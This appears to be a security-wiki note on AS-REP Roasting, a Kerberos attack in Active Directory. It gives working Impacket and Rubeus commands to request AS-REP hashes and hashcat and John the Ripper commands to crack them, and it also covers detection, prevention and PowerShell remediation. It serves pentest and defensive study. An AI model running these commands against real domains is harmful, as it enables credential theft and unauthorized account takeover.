# AS-REP Roasting

## Overview
AS-REP Roasting is an attack technique targeting Kerberos authentication where an attacker requests authentication service reply (AS-REP) messages for users with **"Do not require Kerberos preauthentication"** enabled, allowing offline password cracking.

## Prerequisites
- **Domain user account** (even low-privileged)
- **Target accounts** with "Do not require Kerberos preauthentication" enabled
- **Network access** to Domain Controller

## How It Works
1. **Enumerate users** with preauthentication disabled
2. **Request AS-REP** from KDC without providing password proof
3. **Extract hash** from AS-REP response
4. **Crack offline** using tools like Hashcat or John

## Attack Steps

### 1. Enumerate Vulnerable Users
```bash
# Using impacket-GetNPUsers
impacket-GetNPUsers domain.com/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast

# With credentials
impacket-GetNPUsers domain.com/username:password -request -format hashcat -outputfile hashes.asreproast

# PowerShell (on Windows)
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```

### 2. Request AS-REP Without Preauthentication
```bash
# Using Rubeus (Windows)
Rubeus.exe asreproast /user:targetuser /format:hashcat /outfile:hash.txt

# Using impacket-GetNPUsers
impacket-GetNPUsers domain.com/user:pass -request -dc-ip 10.10.10.10
```

### 3. Extract and Format Hash
```bash
# Example AS-REP hash format
$krb5asrep$23$user@DOMAIN.COM:hash_value_here
```

### 4. Crack Password Offline
```bash
# Using Hashcat
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule

# Using John the Ripper  
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast
```

## Tools Used

### Impacket Suite
```bash
# GetNPUsers.py - Main tool for AS-REP roasting
impacket-GetNPUsers domain.com/username:password -request -format hashcat

# With user list
impacket-GetNPUsers domain.com/ -usersfile users.txt -format hashcat -no-pass
```

### Rubeus (Windows)
```bash
# AS-REP roast single user
Rubeus.exe asreproast /user:username

# AS-REP roast all users
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt
```

### PowerShell
```powershell
# Find users with preauthentication disabled
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth | Select Name, DoesNotRequirePreAuth
```

## Detection
- **Monitor Event ID 4768**: Kerberos authentication ticket (TGT) was requested
- **Look for AS-REQ without preauthentication data**
- **Unusual patterns** of AS-REP requests
- **Failed authentication attempts** on service accounts

## Prevention
1. **Enable Kerberos preauthentication** for all users
2. **Use strong passwords** for service accounts
3. **Regular password rotation**
4. **Implement account lockout policies**
5. **Monitor Kerberos logs** for suspicious activity
6. **Use Group Managed Service Accounts (gMSA)**

## PowerShell Remediation
```powershell
# Enable preauthentication for specific user
Set-ADUser -Identity "username" -DoesNotRequirePreAuth $False

# Find and fix all users with disabled preauthentication
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} | Set-ADUser -DoesNotRequirePreAuth $False
```

## Related Attacks
- [[Kerberoasting]] - Targeting service accounts
- [[Golden Ticket]] - Kerberos ticket forging
- [[Silver Ticket]] - Service ticket forging
- [[Pass the Ticket]] - Kerberos ticket reuse

## Related Tools
- [[Impacket]]
- [[Rubeus]]
- [[Bloodhound]] - AD enumeration
- [[JohnTheRipper]]
- [[Hashcat]]

## References
- [[Active Directory]]
- [[Kerberos]]
- [[Domain Controller (DC)]]
